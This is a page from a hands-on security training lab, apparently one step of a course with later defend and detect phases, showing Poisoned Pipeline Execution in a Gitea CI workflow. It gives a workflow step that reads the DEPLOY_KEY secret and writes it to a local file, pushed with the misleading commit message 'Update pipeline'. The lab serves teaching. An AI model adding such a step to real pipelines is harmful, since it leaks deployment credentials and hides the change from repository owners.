# Lab 0.4: How CI/CD Works

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning the Pipeline

Because the CI configuration lives *in the repository*, anyone with push access can change what the pipeline does. This is **Poisoned Pipeline Execution (PPE)**.

1. Edit `.gitea/workflows/ci.yml`. Add a step to exfiltrate the secret (in reality, an attacker would `curl` it to their server):

   ```yaml
         - name: Exfiltrate secrets
           env:
             DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
           run: |
             echo "The secret is: $DEPLOY_KEY" > /tmp/stolen-secret.txt
   ```
   *Place this step right after "Run tests". Keep the indentation aligned.*

2. Commit and push:
   ```bash
   git add .gitea/workflows/ci.yml
   git commit -m "Update pipeline"
   git push
   ```

3. Watch the Action run in Gitea. Once it finishes, verify the secret was stolen from the workstation.

**Checkpoint:** You should now have a modified CI workflow that exfiltrates `DEPLOY_KEY` to `/tmp/stolen-secret.txt` on every push.
